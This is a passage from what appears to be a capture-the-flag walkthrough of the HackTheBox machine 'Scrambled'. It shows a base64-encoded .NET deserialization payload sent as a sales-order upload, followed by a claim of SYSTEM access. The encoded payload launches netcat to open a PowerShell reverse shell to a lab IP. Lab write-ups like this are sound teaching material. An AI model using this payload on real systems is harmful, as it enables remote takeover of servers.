UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMndVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRRdU15QTFORFU0SWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.

```

And we are inside as NT Authority:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/scrambled/7_1_in.png" width="70%"/>
</p>
